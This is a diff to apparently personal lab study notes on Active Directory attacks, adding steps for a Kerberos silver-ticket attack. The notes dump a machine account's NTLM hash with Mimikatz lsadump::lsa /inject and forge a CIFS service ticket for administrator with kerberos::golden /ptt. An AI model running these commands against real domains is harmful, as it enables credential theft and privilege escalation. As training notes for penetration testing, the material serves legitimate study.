@@ -221,12 +221,19 @@ Which Mimikatz command is used to extract Kerberos tickets from memory for pass-
 _______________________________________________________________________________________________________________________________________________________________________________________________
 Silver ticket
 -------------
+
+Silver ticket is targeted the TGS
+
 1. Pass the hash to domain admin
 2. Get the domain controller (KDC)'hash NTLM --> user : PROD$ hash NTLM
 
 C:> invoke-mimikatz -command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local
 
 3. Generate silver ticket to the administrator with KDC (that command must be run under the domain user(student) not in domain admin(student))
+
+C:> klist
+
+CIFS is already have an access with administrator, so I have to take advantage to that service.
 
 C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /target:prod.research.security.local /service:CIFS /rc4:f2c8slad8245023845(KDC's NTLM hash) 
 /user:administrator /ptt"'
